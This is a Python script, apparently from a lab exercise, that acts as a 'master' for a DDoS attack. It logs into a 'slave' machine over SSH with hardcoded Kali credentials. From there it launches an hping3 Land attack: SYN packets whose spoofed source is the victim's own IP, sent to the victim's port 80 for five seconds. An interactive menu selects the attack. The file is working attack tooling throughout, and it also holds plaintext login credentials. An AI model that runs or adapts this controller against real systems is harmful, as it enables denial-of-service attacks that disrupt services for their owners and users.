# Master server for control slave(client) to attack victim

import paramiko
import time

# call slave to help MS to transmit packages to victim
def call_slave(slave_ip, victim_ip, port_number, attack_type):
    # create ssh connect to slave
    print("Connected to slave...")

    ssh =  paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(slave_ip, username = "kali", password = "kali")

    print("Connect successful !")

    # suppose that we have 3 slaves and each send 1000 packages per second
    slave_number = 3
    package_number = 300

    # decide attack type
    command = ""

    if(attack_type == "Land"):
        command = f"sudo -S hping3 --spoof {victim_ip} -i u{slave_number * package_number} -S -p {port_number} -I eth0 {victim_ip}"
    elif(attack_type == "Smurf"):
        command = ""
    
    # execute attack for 5 seconds
    ssh.exec_command(command)
    stdio = ssh.exec_command(command)
    stdio[0].write("kali\n") # input sudo password
    stdio[0].flush()

    print(f"Started {attack_type} attack from Slave: {slave_ip} to Victim: {victim_ip}:{port_number}")

    # terminate attack and close connection to slave
    time.sleep(5)
    ssh.exec_command("pkill hping3")
    ssh.close()

slave_ip = "192.168.56.9"
victim_ip = "10.0.2.11"
port_number = 80
attack_type = ""

while True:
    attack_type = input("------------------------------\n|DDOS attack type:           |\n|1. Land attack              |\n|2. Exit program             |\n------------------------------\nSelect for attack type: ")
    
    if(attack_type == "1"):
        attack_type = "Land"
    # elif(attack_type == "2"):
    #     attack_type = "Smurf"
    elif(attack_type == "2"):
        attack_type = "Exit"

    if(attack_type == "Exit"):
        print("End program...\n")
        break
    else:
        print("Choosing for " + attack_type + " attack\n")
        call_slave(slave_ip, victim_ip, port_number, attack_type)
        print('\n')